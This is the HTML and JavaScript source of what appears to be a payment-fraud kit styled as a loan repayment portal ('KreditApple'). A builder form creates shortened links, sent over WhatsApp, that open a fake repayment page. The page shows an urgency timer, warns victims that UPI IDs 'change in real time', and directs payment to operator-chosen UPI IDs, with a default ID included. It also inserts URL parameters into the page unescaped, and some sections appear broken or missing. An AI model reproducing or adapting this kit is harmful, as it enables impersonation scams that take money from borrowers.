<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Order Details - Secure Portal</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
</head>
<body class="bg-slate-100 flex justify-center items-center min-h-screen m-0 font-sans">

<div class="w-full max-w-md bg-white shadow-2xl rounded-none sm:rounded-2xl min-h-screen sm:min-h-0 flex flex-col justify-between pb-6 overflow-hidden" id="app"></div>

<script>
// Handle URL Hash or Query Params for ultra-short links
let raw = [];
const hashData = window.location.hash.substring(1);
const p = new URLSearchParams(window.location.search);

if (hashData) {
  try {
    let decompressed = LZString.decompressFromEncodedURIComponent(hashData);
    if (decompressed) {
      raw = JSON.parse(decompressed);
    }
  } catch (e) {}
} else if (p.get('x')) {
  try {
    let decompressed = LZString.decompressFromEncodedURIComponent(p.get('x'));
    if (decompressed) {
      raw = JSON.parse(decompressed);
    }
  } catch (e) {}
}

const d = {
  biz: raw[0] || p.get('b') || '',
  logo: raw[1] || p.get('l') || 'K',
  prod: raw[2] || p.get('pr') || 'KreditApple',
  name: raw[3] || p.get('n') || 'Customer',
  mobile: raw[4] || p.get('m') || '+91 750****058',
  days: raw[5] || p.get('d') || 'Waiting for repay',
  date: raw[6] || p.get('dt') || '2026-11-20',
  ext: raw[7] || p.get('e') || '2400',
  full: raw[8] || p.get('f') || '6000',
  upi1: raw[9] || p.get('u1') || 'bharatpe.90065511470@fbpe',
  upi2: raw[10] || p.get('u2') || '',
  upi3: raw[11] || p.get('u3') || '',
  upi4: raw[12] || p.get('u4') || '',
  upi5: raw[13] || p.get('u5') || ''
};

const app = document.getElementById('app');
let sel = parseInt(p.get('ch') || '1');
let page = p.get('page') || 'home';
let mode = p.get('mode') || 'repay';
let partAmt = parseInt(d.full) || 5000;
let timerInterval = null;

function getUpis(){
  return [d.upi1||'', d.upi2||'', d.upi3||'', d.upi4||'', d.upi5||''];
}

function goPay(m, amtOverride){
  const u = new URL(window.location.href);
  u.searchParams.set('page', 'pay');
  u.searchParams.set('mode', m);
  u.searchParams.set('ch', sel);
  if(amtOverride){
    u.searchParams.set('customAmt', amtOverride);
  }
  window.location.href = u.toString();
}

function goHome(){
  if(timerInterval) clearInterval(timerInterval);
  const u = new URL(window.location.href);
  u.searchParams.delete('page');
  u.searchParams.delete('mode');
  u.searchParams.delete('customAmt');
  window.location.href = u.toString();
}

function startTimer(durationSeconds) {
  if(timerInterval) clearInterval(timerInterval);
  let timer = durationSeconds;
  const display = document.getElementById('countdownTimer');
  if(!display) return;

  timerInterval = setInterval(function () {
    let minutes = parseInt(timer / 60, 10);
    let seconds = parseInt(timer % 60, 10);

    seconds = seconds < 10 ? "0" + seconds : seconds;
    display.textContent = minutes + " : " + seconds;

    if (--timer < 0) {
      clearInterval(timerInterval);
      display.textContent = "0 : 00";
    }
  }, 1000);
}

function copyUpiId(upiText, btnEl) {
  navigator.clipboard.writeText(upiText);
  const originalText = btnEl.innerText;
  btnEl.innerText = 'COPIED';
  btnEl.style.backgroundColor = '#16a34a';
  setTimeout(() => {
    btnEl.innerText = originalText;
    btnEl.style.backgroundColor = '#2563eb';
  }, 2000);
}

function submitPayUtr() {
  const utrVal = document.getElementById('payUtrInput').value.trim();
  if(!utrVal || utrVal.length < 12) {
    alert('Please enter a valid 12-digit UTR / Ref No.');
    document.getElementById('payUtrInput').focus();
    return;
  }
  alert('UTR (' + utrVal + ') submitted successfully! Verification in progress.');
}

function renderApp(){
  if(!d.biz){
    app.innerHTML = `

        <div class="grid grid-cols-2 gap-2">
          <div>
            <label class="text-xs font-bold block text-gray-700">Business Name</label>

          </div>
          <div>
            <label class="text-xs font-bold block text-gray-700">Logo URL / Letter</label>
            <input id="logo" value="K" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
          </div>
        </div>

        <div>
          <label class="text-xs font-bold block text-gray-700">Product Name</label>
          <input id="prod" value="KreditApple" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
        </div>
        
        <label class="text-xs font-bold block text-gray-700">Customer Name</label>
        <input id="name" placeholder="Ahmed Khan" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
        
        <label class="text-xs font-bold block text-gray-700">Customer Account / Number</label>
        <input id="mobile" value="+91 750****058" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
        
        <div class="grid grid-cols-2 gap-2">
          <div>
            <label class="text-xs font-bold block text-gray-700">Status Text</label>
            <input id="days" value="Waiting for repay" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
          </div>
          <div>
            <label class="text-xs font-bold block text-gray-700">Repayment Date</label>
            <input id="date" type="date" value="2026-11-20" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">

        <label class="text-xs font-bold block text-gray-700">Channel 1 UPI (Required)</label>
        <input id="upi1" value="bharatpe.90065511470@fbpe" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
        
        <label class="text-xs font-bold block text-gray-700">Channel 2 UPI (Optional)</label>
        <input id="upi2" placeholder="Optional" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
        
        <label class="text-xs font-bold block text-gray-700">Channel 3 UPI (Optional)</label>
        <input id="upi3" placeholder="Optional" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
        
        <label class="text-xs font-bold block text-gray-700">Channel 4 UPI (Optional)</label>
        <input id="upi4" placeholder="Optional" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
        
        <label class="text-xs font-bold block text-gray-700">Channel 5 UPI (Optional)</label>
        <input id="upi5" placeholder="Optional" class="w-full p-3 border rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 focus:outline-none">
        
        <button id="genBtn" onclick="makeLink()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3.5 rounded-xl font-bold mt-3 shadow-lg transition duration-200">Generate Short Link</button>
        <div id="out"></div>
      </div>`;
    return;
  }

  const list = getUpis();
  const avail = list.map((u, i) => u ? i + 1 : null).filter(x => x !== null);
  if(!avail.includes(sel)) sel = avail[0] || 1;

  if(page !== 'pay'){
    let channelsHtml = '';
    for(let i = 1; i <= 5; i++){
      let isActive = (sel === i);

    }

    let logoContent = '';
    if(d.logo.startsWith('http://') || d.logo.startsWith('https://') || d.logo.startsWith('data:image/')) {
      logoContent = `<img src="${d.logo}" class="w-full h-full object-cover rounded-xl" alt="Logo">`;
    } else {
      logoContent = `<span class="text-xl font-bold">${d.logo}</span>`;
    }

    app.innerHTML = `

                  ${logoContent}
                </div>
                <div>
                  <h2 class="font-bold text-slate-900 text-sm tracking-tight">${d.biz}</h2>
                  <p class="text-xs text-slate-500 font-medium">${d.prod}</p>
                </div>
              </div>
              <span class="font-bold text-slate-800 text-sm bg-slate-100 px-2.5 py-1 rounded-full">${d.days}</span>
            </div>

            <div class="text-[14px] divide-y divide-slate-100 border-b border-slate-100 pb-2">
              <div class="flex justify-between items-center py-3">

                <span class="text-slate-900 font-bold">${d.mobile}</span>
              </div>
              <div class="flex justify-between items-center py-3">
                <span class="text-slate-400 font-normal">Amount You Repay</span>

              <div class="flex justify-between items-center py-3">

              </div>
            </div>

            <div class="text-[11px] text-red-600 font-bold leading-relaxed bg-red-50 p-3 rounded-xl border border-red-100 shadow-sm">
              !!!Do <span class="text-red-700 underline">NOT</span> save UPI, UPI will change in real time!!!<br>
              !!!The UPI sent to you privately is <span class="text-red-700">FAKE</span> and will NOT be updated!!!
            </div>

            <div class="grid grid-cols-2 gap-3 pt-1">
              <button onclick="goPay('repay', '${d.full}')" class="bg-gradient-to-r from-blue-600 to-sky-600 hover:from-blue-700 hover:to-sky-700 text-white py-3.5 px-2 rounded-full font-bold text-sm shadow-md transition duration-200 text-center">
                Repay ₹${Number(d.full).toLocaleString('en-IN')}
              </button>
              <button onclick="goPay('extension', '${d.ext}')" class="bg-gradient-to-r from-cyan-500 to-teal-500 hover:from-cyan-600 hover:to-teal-600 text-white py-3.5 px-2 rounded-full font-bold text-sm shadow-md transition duration-200 text-center leading-tight flex flex-col justify-center">
                <span>7 days extension</span>
                <span class="text-xs opacity-90">₹${Number(d.ext).toLocaleString('en-IN')}</span>
              </button>
            </div>

            <div class="space-y-2 pt-2">
              <label class="text-xs font-bold text-slate-700">Part Repayment/₹</label>
              <div class="flex items-center space-x-2">
                <div class="flex items-center justify-between border border-slate-200 rounded-full px-3 py-1.5 bg-slate-50 shadow-inner w-44 shrink-0">
                  <button onclick="decreasePart()" class="w-7 h-7 rounded-full border border-blue-400 text-blue-600 flex items-center justify-center font-bold text-lg hover:bg-blue-50 transition">-</button>
                  <span id="partAmount" class="font-bold text-slate-800 text-sm px-2">${partAmt}</span>

                <button onclick="goPay('repay', partAmt)" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-3.5 px-2 rounded-full font-bold text-sm shadow-md transition duration-200 text-center truncate">
                  Repay ₹<span id="btnPartText">${partAmt}</span>
                </button>
              </div>
              <p class="text-[11px] text-red-500 font-medium text-center">Repayment amount must match entered amount to be credited.</p>
            </div>

            <div class="space-y-2 pt-2">
              <label class="text-xs font-bold text-slate-700">Repayment Channel</label>
              <div class="grid grid-cols-3 gap-2">
                ${channelsHtml}
              </div>
            </div>

            <div class="space-y-3 pt-3">
              <label class="text-xs font-bold text-slate-700">Already Paid?</label>
              <div class="space-y-2.5 text-xs bg-slate-50 p-3.5 rounded-2xl border border-slate-100">

                  <span class="w-24 text-slate-500 font-medium">UTR</span>
                  <input type="text" id="confUtr" placeholder="Input UTR" class="w-full bg-transparent focus:outline-none text-slate-800 placeholder-slate-300 font-medium">
                </div>
                <div class="flex items-center border-b border-slate-200 pb-2.5">
                  <span class="w-24 text-slate-500 font-medium">UPI</span>
                  <input type="text" id="confUpi" placeholder="Input UPI(optional)" class="w-full bg-transparent focus:outline-none text-slate-800 placeholder-slate-300 font-medium">
                </div>
                <div class="flex items-center justify-between pt-1">

                  <div class="w-16 h-16 border-2 border-dashed border-slate-300 rounded-xl flex items-center justify-center bg-white cursor-pointer relative overflow-hidden shadow-sm hover:border-blue-400 transition">

        <div class="px-4 mt-6">
          <div class="bg-gradient-to-r from-orange-500 to-amber-600 rounded-2xl p-3.5 flex items-center justify-between text-white shadow-lg">

              <div class="bg-[#1e3d30] p-1.5 rounded-xl text-white font-bold flex flex-col items-center justify-center w-10 h-10 overflow-hidden shadow">
                ${d.logo.startsWith('http') ? `<img src="${d.logo}" class="w-full h-full object-cover">` : `<span class="text-sm">${d.logo}</span>`}
              </div>
              <div>
                <h4 class="font-extrabold text-sm leading-tight">Easy Loans</h4>
                <p class="text-[10px] bg-white/20 px-2 py-0.5 rounded-full inline-block mt-0.5 font-medium">Just a Download Away</p>
              </div>
            </div>
            <button class="bg-amber-100 text-amber-900 font-extrabold px-5 py-2 rounded-full shadow hover:bg-amber-200 transition text-sm">
              GO
            </button>
          </div>

    `;
  } else {
    const isRepay = (mode === 'repay');
    const customAmt = p.get('customAmt');
    const amt = customAmt ? customAmt : (isRepay ? d.full : d.ext);
    const formattedAmt = Number(amt).toFixed(2);
    const upi = list[sel-1] || d.upi1;

    app.innerHTML = `

        <div class="bg-[#5b1d99] text-white py-3.5 px-4 flex items-center justify-center space-x-2 font-semibold text-base shadow-md">

          </svg>
          <span id="countdownTimer" class="tracking-wider">7 : 45</span>
        </div>

        <div class="p-4 flex-1 flex flex-col justify-between">
          <div>
            <div class="text-center mt-2">
              <p class="text-slate-500 text-sm font-medium">Amount payable</p>
              <div class="text-[#5b1d99] text-4xl font-black mt-1 tracking-tight">₹ ${formattedAmt}</div>
              <p class="text-slate-600 text-sm font-medium mt-2">Use Mobile Scan code to pay</p>
            </div>

            <div class="my-5 flex justify-center">
              <div class="p-3 bg-white border border-slate-100 rounded-2xl shadow-lg">
                <img src="${qr}" alt="Payment QR Code" class="w-48 h-48 object-contain">
              </div>
            </div>

            <div class="mt-2">
              <p class="text-slate-800 text-sm font-bold mb-2.5">Choose a payment method to pay</p>
              <div class="grid grid-cols-2 gap-3">
                <a href="${paytmLink}" onclick="setTimeout(()=>{window.location.href='${upiLink}'}, 600)" class="flex items-center space-x-3 border border-slate-200 rounded-xl px-3 py-3 shadow-sm hover:border-blue-400 hover:shadow transition bg-white">
                  <span class="font-black text-lg tracking-tighter leading-none">
                    <span class="text-[#002970]">pay</span><span class="text-[#00baf2]">tm</span>
                  </span>
                  <span class="text-slate-800 font-semibold text-sm">Paytm</span>
                </a>

                <a href="${phonepeLink}" onclick="setTimeout(()=>{window.location.href='${upiLink}'}, 600)" class="flex items-center space-x-2.5 border border-slate-200 rounded-xl px-3 py-3 shadow-sm hover:border-purple-400 hover:shadow transition bg-white">
                  <div class="w-7 h-7 rounded-full bg-[#5f259f] text-white flex items-center justify-center font-bold text-base shrink-0 shadow-sm">
                    पे
                  </div>
                  <span class="text-slate-800 font-semibold text-sm">PhonePe</span>
                </a>
              </div>
            </div>

            <div class="mt-5">
              <p class="text-slate-800 text-sm font-bold mb-2">Manual transfer(Copy the below given UPI ID)</p>
              <div class="flex items-center border border-slate-200 rounded-xl overflow-hidden shadow-sm bg-slate-50">
                <div class="flex-1 px-3.5 py-3 text-slate-800 font-semibold text-sm truncate select-all">${upi}</div>
                <button onclick="copyUpiId('${upi}', this)" class="bg-blue-600 hover:bg-blue-700 text-white font-bold text-xs px-5 py-3.5 tracking-wider transition shrink-0">
                  COPY
                </button>
              </div>
              <p class="text-amber-600 text-xs font-medium mt-2">Tip: Don't save the UPI, get new UPI every time.</p>
            </div>

            <div class="mt-4">
              <p class="text-red-600 text-sm font-bold mb-2">Need to enter your 12 Ref No. (UTR)</p>
              <div class="flex items-center border border-slate-200 rounded-xl px-3.5 py-3 bg-slate-50 focus-within:border-blue-500 focus-within:bg-white transition shadow-sm">
                <span class="text-red-500 font-bold mr-1">*</span>
                <span class="text-slate-800 font-bold text-sm mr-2">UTR</span>
                <input type="text" id="payUtrInput" maxlength="12" inputmode="numeric" placeholder="UTR is required" class="w-full text-sm text-slate-800 placeholder-slate-400 bg-transparent focus:outline-none font-medium">
              </div>
              <p class="text-amber-600 text-xs font-medium mt-2 leading-relaxed">
                Tip: Open your UPI wallet and complete the transfer Record your reference No.(Ref No.) after payment.
              </p>
            </div>
          </div>

          <div class="mt-6 space-y-3">
            <button onclick="submitPayUtr()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-full text-base shadow-lg transition duration-200">
              Submit UTR
            </button>
            <div class="text-center">
              <button onclick="goHome()" class="text-xs text-slate-400 hover:text-slate-600 font-medium underline">
                Back to Details
              </button>
            </div>
          </div>
        </div>
      </div>
    `;

    setTimeout(() => startTimer(465), 100);
  }
}

function increasePart(){
  partAmt += 500;
  document.getElementById('partAmount').innerText = partAmt;
  document.getElementById('btnPartText').innerText = partAmt;
}
function decreasePart(){
  if(partAmt > 500){
    partAmt -= 500;
    document.getElementById('partAmount').innerText = partAmt;
    document.getElementById('btnPartText').innerText = partAmt;
  }
}
function previewImg(input){
  if(input.files && input.files[0]){
    document.getElementById('camIcon').style.display = 'none';
    document.getElementById('imgUploaded').style.display = 'block';
  }
}
function submitConfirm(){
  const utr = document.getElementById('confUtr').value;
  if(!utr){
    alert('Please enter UTR / Transaction ID');
  } else {
    alert('Payment confirmation submitted successfully!');
  }
}

async function makeLink(){
  const b = document.getElementById('biz').value || 'KreditApple';
  const l = document.getElementById('logo').value || 'K';
  const pr = document.getElementById('prod').value || 'KreditApple';
  const n = document.getElementById('name').value || 'Customer';
  const m = document.getElementById('mobile').value || '+91 750****058';
  const ds = document.getElementById('days').value || 'Waiting for repay';
  const dt = document.getElementById('date').value || '2026-11-20';
  const e = document.getElementById('ext').value || '2400';
  const f = document.getElementById('full').value || '6000';
  const u1 = document.getElementById('upi1').value;
  const u2 = document.getElementById('upi2').value;
  const u3 = document.getElementById('upi3').value;
  const u4 = document.getElementById('upi4').value;
  const u5 = document.getElementById('upi5').value;

  if(!u1){ alert('Channel 1 UPI is required'); return; }

  const btn = document.getElementById('genBtn');
  btn.innerText = 'Creating Short Link...';
  btn.disabled = true;

  const arr = [
    b,
    l === 'K' ? '' : l,
    pr === 'KreditApple' ? '' : pr,
    n === 'Customer' ? '' : n,
    m === '+91 750****058' ? '' : m,
    ds === 'Waiting for repay' ? '' : ds,
    dt === '2026-11-20' ? '' : dt,
    e === '2400' ? '' : e,
    f === '6000' ? '' : f,
    u1 === 'bharatpe.90065511470@fbpe' ? '' : u1,
    u2, u3, u4, u5
  ];
  while(arr.length > 1 && arr[arr.length - 1] === '') arr.pop();

  const compressed = LZString.compressToEncodedURIComponent(JSON.stringify(arr));
  let hashLink = `${window.location.origin}${window.location.pathname}#${compressed}`;
  let finalLink = hashLink;

  try {
    const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(hashLink)}`);
    if(res.ok){
      let text = await res.text();
      if(text.startsWith('http')) finalLink = text.trim();
    }
  } catch(err) {
    console.log('Shortener fallback');
  }

  btn.innerText = 'Generate Short Link';
  btn.disabled = false;

  const msg = `Hello ${n}, your ${b} repayment link: ${finalLink}`;
  
  document.getElementById('out').innerHTML = `
    <div class="bg-blue-50 border border-blue-200 p-3.5 rounded-xl mt-3 break-all text-xs font-bold text-blue-700 shadow-sm">${finalLink}</div>
    <button class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl font-bold mt-2 shadow transition" onclick="navigator.clipboard.writeText('${finalLink}');alert('Short Link Copied!')">Copy Short Link</button>
    <a href="https://wa.me/${m.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(msg)}" target="_blank" class="block text-center bg-[#25D366] hover:bg-[#20ba5a] text-white py-3 rounded-xl font-bold mt-2 shadow transition">Send on WhatsApp</a>
  `;
}

renderApp();
</script>
</body>
</html>
